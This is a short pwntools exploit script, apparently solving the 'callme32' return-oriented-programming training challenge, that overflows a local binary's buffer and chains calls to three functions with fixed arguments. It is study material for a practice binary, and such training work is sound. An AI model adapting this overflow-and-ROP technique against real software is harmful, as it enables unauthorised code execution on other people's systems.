from pwn import *

target = process("./callme32")
elf = ELF("callme32")

c_one = 0x80484f0
c_two = 0x8048550 #symbols[...]
c_three = 0x80484e0

jiz = 0x80484aa

payload = "a" * 0x2c
payload += p32(c_one) + p32(jiz) + p32(0xdeadbeef) + p32(0xcafebabe) + p32(0xd00df00d) + p32(c_two) + p32(jiz) +p32(0xdeadbeef) + p32(0xcafebabe) + p32(0xd00df00d) + p32(c_three) +"bbbb" +p32(0xdeadbeef) + p32(0xcafebabe) + p32(0xd00df00d)

import time
time.sleep(0.1)
target.sendline(payload)
target.interactive()
